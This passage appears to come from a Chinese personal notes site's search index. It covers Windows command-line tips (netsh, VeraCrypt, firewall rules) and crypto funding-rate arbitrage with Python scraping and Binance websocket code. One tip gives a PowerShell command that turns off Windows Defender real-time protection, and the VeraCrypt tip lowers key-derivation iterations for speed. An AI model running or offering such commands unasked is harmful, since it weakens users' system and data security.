\u4ee5\u592a\u7f51","title":"\u547d\u4ee4\u884c\u914d\u7f6eIP"},{"location":"BAT/#ipdns","text":"netsh interface ip set address name=\"\u4ee5\u592a\u7f51\" static 192.168.1.101 255.255.255.0 192.168.1.1 netsh interface ip set dns \"\u4ee5\u592a\u7f51\" static 192.168.1.1","title":"\u914d\u7f6e\u9759\u6001IP\u548cDNS"},{"location":"BAT/#dhcp","text":"netsh interface ip set address name=\"\u4ee5\u592a\u7f51\" dhcp netsh interface ip set dns \"\u4ee5\u592a\u7f51\" dhcp","title":"\u914d\u7f6eDHCP"},{"location":"BAT/#veracrypt","text":"VeraCrypt\u662fTrueCrypt\u4ee3\u66ff\u8005\uff0c\u5176\u547d\u4ee4\u884c\u4f7f\u7528\u65b9\u5f0f\uff1a https://www.veracrypt.fr/en/Command%20Line%20Usage.html \u4e0b\u8f7dPortable\u7248\u672c\u5373\u53ef\uff0c\u4e0b\u8f7d\u5730\u5740\uff1ahttps://www.veracrypt.fr/en/Downloads.html","title":"\u547d\u4ee4\u884c\u4f7f\u7528VeraCrypt"},{"location":"BAT/#_6","text":"\u4e0d\u4e0e\u7528\u6237\u4ea4\u4e92\u6240\u4ee5\u6307\u5b9a /q /s \uff0c\u5177\u4f53\u6765\u8bf4/q\u8868\u793a\u4e0d\u663e\u793a\u4e3b\u7a97\u53e3\uff0c/s\u8868\u793a\u4e0d\u663e\u793a\u4efb\u4f55\u4ea4\u4e92\u7a97\u53e3\u4e5f\u4e0d\u62a5\u9519\uff0c\u6ce8\u610f\u4f7f\u7528\u8fd9\u4e24\u4e2a\u53c2\u6570\u540e\u5373\u4f7f\u51fa\u9519\u4e5f\u4e0d\u4f1a\u6709\u4efb\u4f55\u63d0\u9192 \u6587\u4ef6\u540dtest.hc\uff0c\u5927\u5c0f100M\uff0c\u5bc6\u7801\u5fc5\u987b20\u4e2a\u5b57\u7b26\u6216\u4ee5\u4e0a\uff0c\u52a0\u5bc6\u65b9\u5f0f\u4f7f\u7528\u6700\u5feb\u7684Serpent\uff0c\u4e3a\u4e86\u52a0\u901f\u6302\u8f7d\u8fc7\u7a0b\u6307\u5b9a/pim 1 \"VeraCrypt Format.exe\" /create test.hc /password testtesttesttesttest /hash sha512 /encryption serpent /filesystem FAT /size 100M /pim 1 /force /silent \u5982\u679c\u4e0d\u6307\u5b9a/pim\u6765\u964d\u4f4e\u8fed\u4ee3\u6b21\u6570\uff0c\u6302\u8f7d\u65f6\u9700\u8981\u8017\u65f6\u5341\u79d2\u4ee5\u4e0a\u65e0\u6cd5\u63a5\u53d7\uff0c\u6240\u4ee5\u727a\u7272\u4e00\u70b9\u5b89\u5168\u6027\u6765\u6362\u53d6\u6027\u80fd\u3002\u5173\u4e8ePIM\u7684\u6587\u6863\uff1a https://www.veracrypt.fr/en/Personal%20Iterations%20Multiplier%20(PIM).html","title":"\u521b\u5efa\u4e00\u4e2a\u52a0\u5bc6\u76d8"},{"location":"BAT/#_7","text":"\u6302\u8f7dtest.hc\u81f3Z:\u76d8\uff0c\u9700\u8981\u6307\u5b9a\u4e0e\u521b\u5efa\u8fc7\u7a0b\u76f8\u540c\u7684/pim \u8fd9\u4e2a\u547d\u4ee4\u4f1a\u7acb\u5373\u8fd4\u56de\uff0c\u4f46\u771f\u6b63\u6302\u8f7d\u53ef\u4ee5\u8bbf\u95eeZ\u76d8\u53ef\u80fd\u8fd8\u9700\u8981\u7b49\u5f85\u6570\u79d2 VeraCrypt.exe /quit /silent /volume test.hc /password testtesttesttesttest /pim 1 /l z","title":"\u6302\u8f7d\u52a0\u5bc6\u76d8"},{"location":"BAT/#_8","text":"VeraCrypt.exe /quit /silent /dismount z","title":"\u5378\u8f7d\u5df2\u7ecf\u6302\u8f7d\u7684\u52a0\u5bc6\u76d8"},{"location":"BAT/#windows-defender","text":"\u5728\u8fdb\u884c\u5927\u91cfIO\u64cd\u4f5c\u7684\u65f6\u5019\uff08\u5982\u62f7\u8d1d\u5927\u91cf\u5c0f\u6587\u4ef6\uff09\uff0cWindows Defender\u4f1a\u4e25\u91cd\u62d6\u6162\u4efb\u52a1\u901f\u5ea6 \u5728\u7ba1\u7406\u5458\u6743\u9650\u4e0bpowershell\u53ef\u4ee5\u76f4\u63a5\u4e34\u65f6\u5173\u95edWindows Defender\u7684\u5b9e\u65f6\u9632\u62a4 \u642d\u914delevate.exe\u4f7f\u7528\u5373\u53ef\u5728Win+R\u4e2d\u5feb\u901f\u5173\u95ed\uff1a elevate powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\" \u8fd9\u4e2a\u4f3c\u4e4e\u5728\u6700\u65b0\u7684Windows 2004\u5df2\u7ecf\u5931\u6548","title":"\u547d\u4ee4\u884c\u5173\u95edWindows Defender"},{"location":"BAT/#windowsip","text":"@TAG \u9632\u706b\u5899 \u5f53\u7136\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\u7684cmd\uff0c\u80fd\u4e00\u884c\u641e\u5b9a\u4f55\u5fc5\u5728\u7e41\u7410\u7684\u8bbe\u7f6e\u6b65\u9aa4\u4e2d\u5468\u65cb \u53c2\u8003 https://serverfault.com/questions/851922/blocking-ip-address-with-netsh-filter netsh advfirewall firewall add rule name=\"IP Block\" ^ dir=in interface=any action=block remoteip=198.51.100.108/32","title":"\u547d\u4ee4\u884c\u589e\u52a0Windows\u9632\u706b\u5899\u89c4\u5219\u963b\u65adIP"},{"location":"Bitcoin/","text":"Bitcoin \u00b6 function showwatch1(){ localStorage.setItem(\"watchtab\",\"showwatch1\"); tablebodysort(document.querySelector(\"#realtimeprofittbody\"), 6, 1); var idx=1; document.querySelector(\"#realtimeprofittbody\").querySelectorAll(\"tr\").forEach(function (i){ var text = i.querySelector(\".headcol\").innerText.trim(); if(text.startsWith(\"u\")||text.startsWith(\"h\")||idx>10||i.querySelector(\"td:nth-child(2)\").textContent.indexOf(\"-\")==0||i.querySelector(\"td:nth-child(3)\").textContent.indexOf(\"-\")==0||i.querySelector(\"td:nth-child(4)\").textContent.indexOf(\"-\")==0||i.querySelector(\"td:nth-child(5)\").textContent.indexOf(\"-\")==0){ i.style.display=\"none\"; return } i.style.display=\"\"; idx+=1; }) } function showwatch2(){localStorage.setItem(\"watchtab\",\"showwatch2\");return showtrs(['SHIB','XCH','ICP','FIL','KSM','hBNB','hLTC','hBTCDOM'])} function showwatch3(){localStorage.setItem(\"watchtab\",\"showwatch3\");return showtrs(['KSM','ANT','SHIB','XCH','BSV','DOGE'])} function showwatch4(){localStorage.setItem(\"watchtab\",\"showwatch4\");return showtrs(['KSM','FIL','XCH'])} function showwatch_huobi(){localStorage.setItem(\"watchtab\",\"showwatch_huobi\");document.querySelector(\"#realtimeprofittbody\").querySelectorAll(\"tr\").forEach(function(i){ var c = i.querySelector(\".headcol\").innerText.trim()[0] i.style.display=(c==c.toLowerCase()?\"none\":\"\") })} function showwatch_huobiu(){localStorage.setItem(\"watchtab\",\"showwatch_huobiu\");return show_prefix(\"u\")} function showwatch_binance(){localStorage.setItem(\"watchtab\",\"showwatch_binance\");return show_prefix(\"b\")} function showwatch_binanceu(){localStorage.setItem(\"watchtab\",\"showwatch_binanceu\");return show_prefix(\"h\")} function showwatch_okex(){localStorage.setItem(\"watchtab\",\"showwatch_okexu\");return show_prefix(\"o\")} \u6211\u4e5f\u6765\u8bd5\u6c34\u5f53\u4e2a\u88ab\u5272\u7684\u97ed\u83dc\u4e86 \u5957\u5229\u5b9e\u65f6\u6536\u76ca\u7387 \u00b6 \u4ee5\u4e0b\u4e3a\u5b9e\u65f6\u6536\u76ca\u7387\u6570\u636e\uff08\u6bcf\u5929\u66f4\u65b0\u4e00\u6b21\uff09\uff1a Code \u9884\u6d4b\u6536\u76ca\uff1a\u4e0b\u4e00\u6b21\u7ed3\u7b97\u6536\u76ca\uff08\u786e\u5b9a\u503c\uff09+\u4e0b\u4e0b\u6b21\u7ed3\u7b97\u6536\u76ca\uff08\u9884\u4f30\u503c\uff0c\u968f\u4ef7\u5dee\u6ce2\u52a8\uff09\uff0c\u5355\u4f4d\u4e3a\u5343\u5206\u4e4b \u6628\u65e5\u6536\u76ca\uff1a\u6700\u8fd1\u4e09\u6b21\u7ed3\u7b97\u7684\u7d2f\u8ba1\u6536\u76ca 7\u65e5\u5e74\u5316\uff1a\u6700\u8fd121\u6b21\u7ed3\u7b97\u5e73\u5747\u6536\u76ca \u5177\u4f53\u8ba1\u7b97\u89c1\u4e0a\u6587 \u8ba1\u7b97\u6536\u76ca\u7387 \u663e\u793a\u5168\u90e8 \u5173\u6ce81 \u5173\u6ce82 \u5173\u6ce83 \u5173\u6ce84 \u706b\u5e01 \u706b\u5e01u \u5e01\u5b89 \u5e01\u5b89u OKex https://d.py3.io/btc.html \u671f\u8d27\u6c38\u7eed\u5408\u7ea6\u4ecb\u7ecd \u00b6 \u4ee5\u706b\u5e01\u7684btc\u5408\u7ea6\u4e3a\u4f8b\uff0c\u4ea4\u6613\u5355\u4f4d\u6700\u5c0f\u662f\u4e00\u5f20100 USD\u7f8e\u5143\uff08\u5176\u4ed6\u5e01\u79cd\u90fd\u662f10\u7f8e\u5143\uff09 \u4ea4\u6613\u90fd\u662f\u57fa\u4e8ebtc\u62c5\u4fdd\uff0c\u6323\u5230\u7684\u4e5f\u662fbtc \u4e70\u51651\u5f20\u770b\u6da8 \u505a\u591a \uff1a\u76f8\u5f53\u4e8e\u6309\u7167\u73b0\u5728\u7684\u5408\u7ea6\u4ef7\u683c\u7528100USD\u4e70\u5165btc\uff0c\u4e5f\u5c31\u662f\u501f\u5230\u4e86\u5e01\uff0c\u671f\u5f85\u6bd4\u7279\u5e01\u4ef7\u683c\u4e0a\u6da8\uff1b\u627f\u8bfa\u672a\u6765\u4f1a\u5356\u51fabtc\u5e73\u4ed3\u5f97\u5230100USD\u8fd4\u8fd8\uff0c\u5728\u5e73\u4ed3\u65f6\u5982\u679c\u771f\u7684\u6da8\u4e86\uff0c\u90a3\u65f6\u9700\u8981\u5356\u51fa\u7684btc\u5c31\u6bd4\u5f53\u65f6\u5f00\u4ed3\u65f6\u7684\u6570\u91cf\u5c11\uff0c\u8fd9\u4e2a\u5dee\u5f02\u7684\u90e8\u5206\u5c31\u662f\u6323\u5230\u7684btc\uff1b\u5982\u679cbtc\u4ef7\u683c\u4e00\u76f4\u4e0b\u8dcc\uff0c\u8d26\u6237\u91cc\u6240\u6709\u7684btc\u5356\u51fa\u90fd\u4e0d\u591f100USD\u5c31\u7206\u4ed3\u4e86\uff08\u5b9e\u9645\u7206\u4ed3\u89c4\u5219\u66f4\u590d\u6742\uff09 \u5356\u51fa1\u5f20\u770b\u8dcc \u505a\u7a7a \uff1a\u76f8\u5f53\u4e8e\u6309\u7167\u73b0\u5728\u7684\u5408\u7ea6\u4ef7\u683c\u5356\u51fabtc\u624b\u4e0a\u62ff\u7740100USD\uff0c\u4e5f\u5c31\u662f\u501f\u5230\u4e86\u7f8e\u5143\uff08\u7136\u800c\u5e76\u4e0d\u80fd\u62ff\u5230\u7f8e\u5143\uff09\uff0c\u627f\u8bfa\u672a\u6765\u4f1a\u628a\u8fd9100\u7f8e\u5143\u4e70\u56debtc\uff0c\u5982\u679c\u6309\u9884\u671f\u771f\u7684\u8dcc\u4e86\u5e73\u4ed3\u65f6\u5c31\u80fd\u4e70\u5230\u66f4\u591a\u7684btc\u3002\u6ce8\u610f\u5230\u4e70\u5356\u8fd9\u4e2a\u671f\u8d27\u90fd\u662f\u57fa\u4e8ebtc\u62c5\u4fdd\u7684\uff0c\u6240\u4ee5\u5982\u679c\u4e0d\u52a0\u6760\u6746\u505a\u7a7a\uff0c\u5c31\u5b8c\u5168\u7b49\u4ef7\u4e8e\u5356\u51fa\u6301\u6709\u7684btc\uff0c\u4e0d\u5b58\u5728\u7206\u4ed3\u98ce\u9669\uff0c\u4e5f\u5c31\u662f\u8bf4\u60f3\u771f\u6b63\u505a\u7a7a\uff08\u82b1\u4eba\u6c11\u5e01\u8d4cbtc\u8dcc\uff09\u5fc5\u987b\u4e0a\u6760\u6746 \u6c38\u7eed\u5408\u7ea6\u8d44\u91d1\u8d39\u7387\u5957\u5229 \u00b6 \u8fd9\u672c\u8d28\u4e0a\u662f\u4e00\u4e2a\u5957\u671f\u4fdd\u503c\u7684\u64cd\u4f5c\uff0c\u662f\u5957\u5229\uff0c\u4e0d\u662f\u9ad8\u9891\u4ea4\u6613\u7b56\u7565\uff0c\u5efa\u4ed3\u540e\u65e0\u9700\u64cd\u4f5c\uff0c\u53ea\u9700\u8981\u89c2\u5bdf\u662f\u5426\u8d8b\u52bf\u53cd\u8f6c\u51b3\u5b9a\u5e73\u4ed3\u65f6\u673a\uff0c\u4f8b\u5982\u5f53\u4e03\u65e5\u5e74\u5316\u6536\u76ca\u4e3a\u8d1f\u65f6\u5e73\u4ed3\u5356\u51fa \u671f\u8d27\u5408\u7ea6\u7684\u4ea4\u6613\u4ef7\u683c\u4e3a\u5565\u4f1a\u4e0e\u73b0\u8d27(BTC/USDT)\u76f8\u5dee\u4e0d\u5927\u5462\uff1f\u56e0\u4e3a\u5b58\u5728\u6bcf8\u4e2a\u5c0f\u65f6\u7684\u7ed3\u7b97\u673a\u5236\uff0c\u5982\u679c\u5408\u7ea6\u4ef7\u683c>\u73b0\u8d27\u4ef7\u683c\uff0c\u8bf4\u660e\u591a\u65b9\u5360\u4f18\uff0c\u5219\u591a\u65b9\u5411\u7a7a\u65b9\u652f\u4ed8\u8d44\u91d1\u8d39\uff0c\u59820.01%\uff08\u5177\u4f53\u6570\u503c\u4e0e\u4ef7\u5dee\u76f8\u5173\uff09\u3002 \u5b98\u65b9\u8bf4\u660e \u5957\u5229\u64cd\u4f5c\uff1a\u7528usdt\u4e70\u5165\u5e01\u79cd\uff0c\u7acb\u523b\u4e0b\u7a7a\u5355\u65e0\u6760\u6746\u505a\u7a7a\u76f8\u540c\u6570\u91cf\u2014\u2014\u8fd9\u6837\u6211\u4eec\u4e00\u4e70\u4e00\u5356\u76f8\u5f53\u4e8e\u6ca1\u6709\u4e70\u5165\uff0c\u8d44\u4ea7\u51c0\u503c\u4e0d\u53d7\u5e01\u4ef7\u6ce2\u52a8\u5f71\u54cd\uff0c\u53ea\u662f\u505a\u7a7a\u6536\u53d6\u8d44\u91d1\u8d39 \u5177\u4f53\u64cd\u4f5c\uff1a\u5148\u5728\u6cd5\u5e01\u4ea4\u6613\u7528\u4eba\u6c11\u5e01\u4e70usdt\uff0c\u7136\u540e\u5728\u5e01\u5e01\u4ea4\u6613\u4e70\u516510.1usdt\u7684\u5e01\uff08\u591a\u4e70\u4e00\u70b9\u7ed9\u6263\u624b\u7eed\u8d39\uff09\uff0c\u7acb\u523b\u8f6c\u5165\u6c38\u7eed\u5408\u7ea6\u8d26\u6237\u5f00\u59cb1\u500d\u505a\u7a7a\u4e00\u5f20\uff0c\u7136\u540e\u957f\u671f\u6301\u6709\u76f4\u5230\u8d8b\u52bf\u53cd\u8f6c\uff08\u6301\u7eed\u652f\u4ed8\u8d44\u91d1\u8d39\uff09\u3002 \u4e0d\u8981\u770b\u8d26\u6237\u7684\u6536\u76ca\u7387\uff0c\u8fd9\u4e2a\u5355\u5355\u662f\u505a\u7a7a\u672c\u8eab\u76f8\u5f53\u4e8e\u6301\u5e01\u7684\u6536\u76ca\u7387\uff0c\u6211\u4eec\u5e76\u6ca1\u6709\u6301\u5e01\uff0c\u6b63\u786e\u7684\u6536\u76ca\u8ba1\u7b97\u5e94\u8be5\u662f\u8d26\u6237\u6743\u76ca\uff08\u5e01\u7684\u6570\u91cf\uff09*\u5f53\u524d\u5e01\u5e01\u4ea4\u6613\u4ef7\u683c\uff0c\u6536\u76ca\u7684\u57fa\u51c6\u6bd4\u8f83\u5e94\u8be5\u662f\u4f4e\u98ce\u9669\u503a\u5238\u800c\u4e0d\u662f\u9ad8\u98ce\u9669\u6301\u5e01 \u5386\u53f2\u6570\u636e\u67e5\u8be2\uff1a \u8d44\u91d1\u8d39\u7387 \u7ed3\u7b97\u4ef7\u683c \u722c\u53d6\u4e00\u4e0b\u5386\u53f2\u6570\u636e\uff1a\uff08\u770b\u8d77\u6765ONT\u5957\u5229\u6536\u76ca\u6700\u9ad8\uff0c\u4e0d\u8fc7\u4e0a\u7ebf\u65f6\u95f4\u4e0d\u591f\u957f\u4e0d\u5177\u6709\u4ee3\u8868\u6027\uff09 \u8ba1\u7b97\u6536\u76ca\u7387 \u65f6\u4e0d\u80fd\u7b80\u5355\u5bf9\u5355\u6b21\u6536\u76ca\u7387\u6c42\u548c\uff0c\u5e94\u8be5\u8003\u8651\u5e01\u4ef7\u6ce2\u52a8\u5bf9\u6700\u540e\u5b9e\u9645\u6536\u76ca\u7684\u5f71\u54cd\uff1a\u5047\u8bbe\u6295\u51651USD\uff0c\u8ba1\u7b97\u6bcf\u6b21\u7ed3\u7b97\u80fd\u6536\u5230\u591a\u5c11\u5e01\uff0c\u7d2f\u52a0\u540e\u6309\u6700\u8fd1\u4e00\u6b21\u7ed3\u7b97\u4ef7\u8ba1\u7b97\u8fd9\u4e9b\u5e01\u503c\u591a\u5c11USD\uff0c\u9664\u4ee5\u7ed3\u7b97\u6b21\u6570\u4e58\u4ee5\u4e00\u5e74\u7684\u7ed3\u7b97\u6b21\u6570\u5373\u4e3a\u5e74\u5316\u6536\u76ca import requests , os , sys , time from decimal import Decimal from functools import lru_cache sess = requests . session () @lru_cache () def getdata ( coin , page = 1 ): page = str ( page ) data = [ Decimal ( i [ 'final_funding_rate' ]) for i in sess . get ( \"https://futures.huobi.com/swap-order/x/v1/swap_funding_rate_page?contract_code=\" + coin + \"-USD&page_index=\" + page + \"&page_size=100\" , headers = { \"source\" : \"web\" }) . json ()[ \"data\" ][ \"settle_logs\" ]] settle = [ Decimal ( i [ \"instrument_info\" ][ 0 ][ \"settle_price\" ]) for i in sess . get ( \"https://futures.huobi.com/swap-order/x/v1/swap_delivery_detail?symbol=\" + coin + \"&page_index=\" + page + \"&page_size=100\" , headers = { \"source\" : \"web\" }) . json ()[ \"data\" ][ \"delivery\" ]] return data , settle def calc_fullprofit ( coin ): data , settle = [], [] page = 1 x = getdata ( coin ) while len ( x [ 0 ]): data . extend ( x [ 0 ]) settle . extend ( x [ 1 ]) page += 1 x = getdata ( coin , page ) profit_coin = sum ([ k / settle [ i ] for i , k in enumerate ( data )]) profit_usd = profit_coin * settle [ 0 ] return \" %.2f \" % ( profit_usd / len ( data ) * 3 * 365 * 100 ) + \"%\" , len ( data ) data = [] for i in \"BTC ETH EOS LINK BCH BSV LTC XRP ETC TRX ADA ATOM IOTA NEO ONT XLM XMR DASH ZEC\" . split ( \" \" ): profit , length = calc_fullprofit ( i ) data . append ([ i , profit , length ]) data . sort ( key = lambda i : i [ 1 ], reverse = True ) for i , profit , length in data : print ( \"\" , i , profit , length , \"\" , sep = \"|\" ) \u98ce\u9669\uff1a From \u6570\u5b57\u5e01\u5957\u5229\u7b80\u53f2\uff08\u4e0b\uff09 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8d44\u91d1\u8d39\u7387\u7684\u5957\u5229\u66f4\u52a0\u9002\u5408\u8d8b\u52bf\u4e0a\u6da8\u7684\u884c\u60c5\uff0c\u800c\u4e14\u8981\u7559\u610f\u884c\u60c5\u7684\u53cd\u8f6c\u5bfc\u81f4\u8d39\u7387\u8d8b\u52bf\u7684\u626d\u8f6c\uff0c\u53ef\u80fd\u4f1a\u5957\u5229\u5931\u6548\uff1b\u8fd8\u6709\u5c31\u662f\u5bf9\u4e8e\u50cf18\u5e74\u7684\u8d8b\u52bf\u4e0b\u8dcc\u884c\u60c5\uff0c\u867d\u7136\u5957\u5229\u903b\u8f91\u4e00\u6837\uff0c\u4f46\u64cd\u4f5c\u4f1a\u66f4\u52a0\u590d\u6742\uff0c\u56e0\u4e3a\u8fd9\u91cc\u9762\u8981\u6d89\u53ca\u5230\u6c38\u7eed\u5408\u7ea6+\u4ea4\u5272\u5408\u7ea6\u7684\u7ec4\u5408\u5bf9\u51b2\uff0c\u5360\u7528\u5e01\u6570\u4e5f\u4f1a\u7ffb\u500d\uff0c\u4e5f\u5c31\u662f\u8bf4\u540c\u6837\u7684\u5e01\u91cf\u5957\u5229\u5e74\u5316\u6536\u76ca\u7387\u8981\u62535\u6298\uff1b\u6240\u4ee5\uff0c\u597d\u597d\u73cd\u60dc\u8fd9\u6765\u4e4b\u4e0d\u6613\u7684\u597d\u884c\u60c5\u5427\u3002 \u4ea4\u6613\u671f\u95f4\u624b\u901f\u6162\u6216\u4ea4\u6613\u4e0d\u6d3b\u8dc3\u4f1a\u5bfc\u81f4\u4e70\u5165\u73b0\u8d27\u4ef7\u683c\u9ad8\u4e8e\u505a\u7a7a\u4ef7\u683c\uff0c\u5bfc\u81f4\u989d\u5916\u7684\u6210\u672c\u635f\u8017\uff1b\u6301\u6709\u671f\u95f4\u7684\u6700\u5927\u98ce\u9669\u5728\u4e8e\u7f8e\u5143\u8d2c\u503c\u7684\u98ce\u9669\uff0c\u4f8b\u5982USDT 7.1\u4e70\u5165\uff0c\u6700\u540e6.9\u5356\u51fa\uff0c\u5373\u4e3a28.2\u2030\u4e8f\u635f \u53e6\u5916\uff0c\u5982\u679cbtc\u6301\u7eed\u4e0a\u6da8\uff0c\u5728\u6301\u4ed3\u4e2d\u770b\u5230\u505a\u7a7a\u4e8f\u4e86\u767e\u5206\u4e4b\u591a\u5c11\u8fd8\u662f\u6709\u70b9\u5fc3\u75db\u7684\uff0c\u8fd9\u5c31\u9700\u8981\u826f\u597d\u7684\u5fc3\u7406\u7d20\u8d28\uff0c\u5957\u5229\u76f8\u6bd4\u4e8e\u6301\u5e01\u52a8\u8f84\u4e00\u592910%\u7684\u6ce2\u52a8\u5c31\u6323\u4e0d\u5230\u591a\u5c11\u94b1hhh \u5957\u5229+\u7f51\u683c\u4ea4\u6613 \u00b6 \u4e0a\u8ff0\u80fd\u88ab\u9009\u51fa\u7684\u8d44\u91d1\u8d39\u7387\u9ad8\u7684\u5957\u5229\u5e01\u79cd\uff0c\u5f80\u5f80\u4e5f\u662f\u6da8\u5e45\u5de8\u5927\u7684\u5e01\u79cd\uff0c\u53ef\u80fd\u8fd8\u4e0d\u5982\u7b80\u5355\u6301\u5e01\u8d5a\u5f97\u66f4\u591a\uff0c\u4e8e\u662f\u53ef\u4ee5\u5c1d\u8bd5\u66f4\u7a33\u59a5\u7f51\u683c\u3002\u7f51\u683c\u7684\u4e00\u4e2a\u7f3a\u70b9\u5728\u4e8e\u8d44\u91d1\u5229\u7528\u7387\u4f4e\uff0c\u7b49\u7740\u6284\u5e95\u4e70\u5165\u7684\u8d44\u91d1\u662f\u95f2\u7f6e\u7684\uff0c\u81ea\u7136\u60f3\u5230\u53ef\u4ee5\u628a\u4e0a\u8ff0\u8d44\u91d1\u8d39\u7387\u5957\u5229\u7ed3\u5408\u8d77\u6765\uff0c\u8fd8\u6ca1\u4e70\u5165\u7684\u90e8\u5206\u5c31\u7b49\u91cf\u505a\u7a7a\uff0c\u4f18\u70b9\u5728\u4e8e\uff1a \u8fd8\u6ca1\u4e70\u5165\u7684\u6284\u5e95\u8d44\u91d1\u80fd\u8d5a\u53d6\u8d44\u91d1\u8d39\u7387\uff0c\u4e0d\u5b8c\u5168\u95f2\u7f6e \u6ca1\u6709usdt\u66b4\u96f7\u98ce\u9669\uff0c\u5e01\u672c\u4f4d\u6c38\u7eed\u5408\u7ea6\u6302\u94a9\u7684\u662f\u7f8e\u5143\u800c\u4e0d\u662fusdt \u624b\u7eed\u8d39\u4f4e\uff0c\u706b\u5e01\u73b0\u8d27\u4ea4\u6613\u53432\uff0c\u5e01\u5b89\u5408\u7ea6\u4ea4\u6613maker\u53ea\u6709\u4e071.5 \u8c03\u7528\u5e01\u5b89python sdk\u81ea\u52a8\u6302\u5355\uff0c\u4ee3\u7801\u903b\u8f91\u662f\uff1a \u83b7\u53d6\u5f53\u524d\u6240\u6709\u7684\u6302\u5355\uff0c\u6bd4\u5bf9\u914d\u7f6e\u7684\u4ef7\u683c\u6570\u7ec4\uff0c\u627e\u5230\u7f3a\u5931\u7684\u4ef7\u683c\u4eec\u3002 \u8fd9\u4e9b\u7f3a\u5931\u7684\u4ef7\u683c\u662f\u56e0\u4e3a\u6302\u5355\u6210\u4ea4\u5bfc\u81f4\u7684\uff0c\u9700\u8981\u8865\u4e0a\u3002 \u6700\u65b0\u6210\u4ea4\u7684\u90a3\u4e00\u5355\u4ef7\u683c\u5b9a\u4e3ap\uff0cp\u672c\u8eab\u662f\u4e0d\u80fd\u8865\u5355\u7684\uff08\u521a\u7a81\u7834\u7684\u7f51\u683c\u672c\u8eab\u518d\u8865\u4e0a\u5c31\u662f\u767d\u4ea4\u624b\u7eed\u8d39\uff09\u3002 \u5c0f\u4e8ep\u7684\u7f3a\u5931\u4ef7\u683c\u9700\u8981\u8865\u4e0abuy\uff0c\u5927\u4e8e\u7684\u8865\u4e0asell\u3002 \u5728\u884c\u60c5\u5267\u70c8\u6ce2\u52a8\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u4e00\u5206\u949f\u5c31\u4f1a\u6210\u4ea4\u591a\u6b21\u8ba2\u5355\u9700\u8981\u53ca\u65f6\u8865\u5355\uff0c\u5c31\u9047\u5230\u4e86\u5177\u4f53\u7f16\u7801\u7684\u6311\u6218\uff1a \u5982\u4f55\u83b7\u53d6\u6700\u65b0\u7684\u6210\u4ea4\u8ba2\u5355\uff1f \u00b6 \u8ba2\u5355\u53f7\u6392\u5e8f\uff1f\u4e0d\u884c\uff0corderId\u53ea\u662f\u6309\u4e0b\u5355\u65f6\u95f4\u9012\u589e\uff0corderId\u6700\u5927\u5e76\u4e0d\u4e00\u5b9a\u6700\u8fd1\u6210\u4ea4 \u83b7\u53d6\u5f53\u524d\u6700\u65b0\u4ef7\u683c\uff0c\u6bd4\u8f83\u54ea\u4e2a\u7f3a\u5931\u4ef7\u683c\u79bb\u6700\u65b0\u4ef7\u683c\u66f4\u8fd1\uff1f\u5728\u884c\u60c5\u5267\u70c8\u6ce2\u52a8\u65f6\u4e0d\u53ef\u9760 \u83b7\u53d6\u5386\u53f2\u6240\u6709\u8ba2\u5355\uff0c\u6309updateTime\u6392\u5e8f\uff1f\u5b9e\u6d4b\u53d1\u73b0\u8fd9\u4e2aapi\u6709\u4e24\u4e2a\u95ee\u9898\uff1a \u591a\u4e2a\u8ba2\u5355updateTime\u76f8\u540c\uff0c\u65e0\u6cd5\u6392\u5e8f\u533a\u5206 \u6570\u636e\u5ef6\u8fdf\uff0c\u6700\u65b0\u6210\u4ea4\u7684\u8ba2\u5355\u5e76\u4e0d\u4e00\u5b9a\u51fa\u73b0 \u89e3\u51b3\u65b9\u6848\u662f\uff1a \u83b7\u53d6\u6700\u65b0\u6210\u4ea4\u7684\u6210\u4ea4\u8bb0\u5f55\uff0c\u4ece\u4e2d\u63d0\u53d6\u5305\u542b\u7684orderId\uff0c\u518d\u67e5\u8be2\u8ba2\u5355\u3002\u4e0d\u6392\u9664\u8fd9\u4e2aREST API\u4e5f\u5b58\u5728\u6570\u636e\u5ef6\u8fdf\u7684\u95ee\u9898 \u4f7f\u7528websocket \u5e01\u5b89Python SDK\u6ca1\u6709\u5e01\u672c\u4f4d\u5408\u7ea6\u63a5\u53e3 \u00b6 \u73b0\u5728\u4ee3\u7801\u5df2\u7ecf\u6709\u66f4\u65b0\u8865\u4e0a\u4e86REST API\u7684\u7f3a\u5931\uff0c\u4f46websocket\u8ba2\u9605\u8d26\u6237\u53d8\u52a8\u7684\u4ee3\u7801\u8fd8\u662f\u5f97\u81ea\u5df1\u6765\uff1a client.py\u91ccstream_get_listen_key\u9644\u8fd1\u52a0\u4e0a\uff1a def futures_stream_get_listen_key(self): res = self._request_futures_api(\"post\", \"listenKey\", True, data={}) return res['listenKey'] \u8c03\u7528\u5c31\u8fd9\u6837\uff1a def start_websocket ( self , handle_order ): def process_message ( msg ): global conn_key if msg [ 'e' ] not in [ 'ACCOUNT_UPDATE' ] and not ( msg [ 'e' ] == 'ORDER_TRADE_UPDATE' and msg [ 'o' ][ 'X' ] == 'NEW' ): myprint ( \"message:\" , msg [ 'e' ], msg ) if msg [ 'e' ] == 'error' : bm . stop_socket ( conn_key ) bm . close () reactor . stop () print ( \"socket stopped, exit now!\" ) exit () elif msg [ 'e' ] == 'ORDER_TRADE_UPDATE' : o = msg [ 'o' ] if o [ 'X' ] != 'FILLED' : return order = { \"price\" : o [ 'p' ], \"orderId\" : o [ 'i' ], \"side\" : o [ \"S\" ], \"symbol\" : o [ \"s\" ], \"clientOrderId\" : o [ \"c\" ] } return handle_order ( order ) client = self . client client . stream_get_listen_key = client . futures_stream_get_listen_key client . FUTURES_URL = client . FUTURES_URL . replace ( \"fapi\" , \"dapi\" ) bm = BinanceSocketManager ( client ) bm . STREAM_URL = \"wss://dstream.binance.com/\" conn_key = bm . start_user_socket ( process_message ) bm . start () \u4e0a\u8ff0\u4ee3\u7801\u76f4\u63a5\u9b54\u6539BinanceSocketManager\u7684\u5e38\u6570\u5b9a\u4e49\u6765\u5b9e\u73b0\u5bf9\u5e01\u672c\u4f4d\u5408\u7ea6API\u7684\u8c03\u7528\uff0c\u8ba2\u9605\u8d26\u6237\u53d8\u52a8\u6d88\u606f\uff0c\u53ea\u5904\u7406ORDER_TRADE_UPDATE\u4e2dFILLED\u7684\u8ba2\u5355\uff0c\u8c03\u7528handle_order\u51fd\u6570\u8fdb\u884c\u5904\u7406 \u5404\u79cd\u5f02\u5e38\u5904\u7406 \u00b6 \u907f\u514d\u91cd\u590d\u4e0b\u5355 : 